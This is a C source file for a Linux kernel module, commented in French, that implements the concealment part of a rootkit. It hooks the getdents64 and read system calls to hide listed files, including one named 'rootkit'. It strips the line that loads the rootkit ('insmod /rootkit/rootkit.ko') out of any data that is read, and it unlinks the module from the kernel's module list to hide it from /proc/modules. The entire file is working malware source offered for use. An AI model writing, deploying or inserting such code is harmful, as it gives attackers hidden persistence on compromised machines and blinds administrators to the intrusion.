#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include "hooking.h"
#include "hide.h"

// Liste chaînée de fichiers cachés
struct hidden_file {
    char name[256];
    struct list_head list;
};

static LIST_HEAD(hidden_files);

// Pour hook
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_read)(const struct pt_regs *);

static char hide_line_substr[] = "insmod /rootkit/rootkit.ko"; // ligne persistante à cacher

void hide_add_file(const char *filename) {
    struct hidden_file *hf = kmalloc(sizeof(*hf), GFP_KERNEL);
    if (!hf) return;
    strlcpy(hf->name, filename, sizeof(hf->name));
    list_add(&hf->list, &hidden_files);
}

// Filtrage de getdents64
static int should_hide(const char *name) {
    struct hidden_file *hf;
    list_for_each_entry(hf, &hidden_files, list) {
        if (strcmp(hf->name, name) == 0)
            return 1;
    }
    return 0;
}

static asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    long ret = orig_getdents64(regs);
    if (ret <= 0) return ret;

    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *) regs->si;
    struct linux_dirent64 *kbuf = kmalloc(ret, GFP_KERNEL);
    struct linux_dirent64 *filtered = kmalloc(ret, GFP_KERNEL);
    if (!kbuf || !filtered) {
        kfree(kbuf);
        kfree(filtered);
        return ret;
    }

    if (copy_from_user(kbuf, dirent, ret)) {
        kfree(kbuf);
        kfree(filtered);
        return ret;
    }

    long bpos = 0;
    long outpos = 0;
    while (bpos < ret) {
        struct linux_dirent64 *d = (void *)((char*)kbuf + bpos);
        if (!should_hide(d->d_name)) {
            size_t reclen = d->d_reclen;
            memcpy((char*)filtered + outpos, d, reclen);
            outpos += reclen;
        }
        bpos += d->d_reclen;
    }

    if (copy_to_user(dirent, filtered, outpos)) {
        outpos = ret;
    }

    kfree(kbuf);
    kfree(filtered);

    return outpos;
}

// Filtrage de read
static asmlinkage long hooked_read(const struct pt_regs *regs) {
    long ret = orig_read(regs);
    if (ret <= 0) return ret;

    char __user *buf = (char __user *)regs->si;
    char *kbuf = kmalloc(ret+1, GFP_KERNEL);
    if (!kbuf) return ret;

    if (copy_from_user(kbuf, buf, ret)) {
        kfree(kbuf);
        return ret;
    }

    kbuf[ret] = '\0';

    // Remove line containing hide_line_substr
    char *pos = strstr(kbuf, hide_line_substr);
    if (pos) {
        // Effacer la ligne
        char *line_start = pos;
        while (line_start > kbuf && *(line_start-1) != '\n')
            line_start--;
        char *line_end = pos;
        while (*line_end && *line_end != '\n')
            line_end++;
        if (*line_end == '\n') line_end++;

        size_t prefix_len = line_start - kbuf;
        size_t suffix_len = (kbuf+ret) - line_end;

        memmove(line_start, line_end, suffix_len);
        ret = prefix_len + suffix_len;
    }

    if (copy_to_user(buf, kbuf, ret)) {
        // do nothing, fail silently
    }

    kfree(kbuf);
    return ret;
}

// Cacher le module dans /proc/modules
// Sur noyau 6+, vous pouvez retirer le module de la liste globale `modules`
// Faites attention: c'est dangereux.
static void hide_module(void) {
    // Removing ourselves from the global module list
    // WARNING: This can cause instability if done incorrectly.
    // It's a common rootkit trick though.
    struct module *mod = THIS_MODULE;
    list_del(&mod->list);
}

// Hooks
static struct ftrace_hook hide_hooks[] = {
    HOOK("__x64_sys_getdents64", hooked_getdents64, &orig_getdents64),
    HOOK("__x64_sys_read", hooked_read, &orig_read),
};

int init_hide(void) {
    int err = install_hooks(hide_hooks, ARRAY_SIZE(hide_hooks));
    if (err) return err;
    hide_module();
    // Vous pouvez ajouter "rootkit" dans hidden_files pour le cacher
    hide_add_file("rootkit");
    return 0;
}

void cleanup_hide(void) {
    remove_hooks(hide_hooks, ARRAY_SIZE(hide_hooks));
}
